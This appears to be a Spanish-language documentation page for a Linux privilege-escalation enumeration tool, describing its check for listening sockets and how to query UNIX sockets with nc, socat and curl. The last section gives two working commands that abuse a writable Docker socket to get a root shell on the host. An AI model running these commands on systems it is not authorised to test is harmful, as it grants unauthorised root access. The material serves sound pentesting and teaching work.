# 馃摕 Sockets

## Valor devuelto
Se devuelve una tabla con aquellos sockets escuchando en el sistema.

*Campos*:
- **FILE**: 
- **PERMISSIONS**: Permisos del archivo.
- **LINKS**: N煤mero de links del archivo.
- **USER**: Usuario al que pertenece dicho archivo.
- **GROUP**: Grupo al que pertenece dicho archivo.
- **SIZE**: Tama帽o del archivo.
- **DATE**: Fecha de la 煤ltima modificaci贸n del archivo.
- **INFO**: Informaci贸n sobre el archivo y los permisos.
- **USES HTTP?**: Si se puede comunicar con ese socket mediante el protocolo HTTP.

La informaci贸n se obtiene de los comandos `ss` y `netstat`.

## 驴De qu茅 sirve esta informaci贸n para escalar privilegios?
Es interesante analizar ciertos sockets, sobre todo aquellos que se puedan comunicar mediante HTTP.

## 驴C贸mo comunicarse con un socket?
```bash
# With netcat-openbsd
nc -U /path/to/socket  # Connect to UNIX-domain stream socket
nc -uU /path/to/socket # Connect to UNIX-domain datagram socket

# With socat
socat - UNIX-CLIENT:/path/to/socket # Connect to UNIX-domain stream or datagram socket
```

## 驴C贸mo comunicarse con un socket mediante HTTP?
```bash
curl --max-time 1 --unix-socket /path/to/socket http:/route
```

## Docker socket con permisos de escritura
Si se tienen permisos de escritura sobre el socket `/var/run/docker.sock` se puede usar para escalar privilegios de la siguiente forma:

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

## Referencias
- [Hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets)
- [Manual (ss)](https://www.man7.org/linux/man-pages/man8/ss.8.html)
- [Manual (netstat)](https://www.man7.org/linux/man-pages/man8/netstat.8.html)
- [Manual (systend.socket)](https://www.man7.org/linux/man-pages/man5/systemd.socket.5.html)









